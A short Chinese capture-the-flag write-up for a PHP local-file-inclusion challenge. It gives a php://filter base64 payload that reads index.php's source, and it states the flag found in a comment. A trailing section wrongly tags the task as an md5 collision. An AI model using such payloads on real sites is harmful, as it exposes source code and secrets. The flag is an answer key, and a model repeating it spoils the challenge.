## 题目

> ### php LFI
>
> http://4.chinalover.sinaapp.com/web7/index.php?file=show.php

## 解答思路

- 由于注释在php解析成html之后会被删除，所以，flag可能会被藏在此处
- 使用base64编码的方式将index.php读取出来


## 解题步骤

1. 提交参数：

   ```php
   ?file=php://filter//read=convert.base64-encode/resource=index.php
   ```
2. 得到返回结果，在注释中找到
   > flag:nctf{edulcni_elif_lacol_si_siht}

## 漏洞挖掘思路

- 无

## 自动化解析

- TODO

- 判断题目特征：`web` `php` `md5 collision`
- 设定题目难度等级`level`为simple
- 提交相应符合要求的字符串

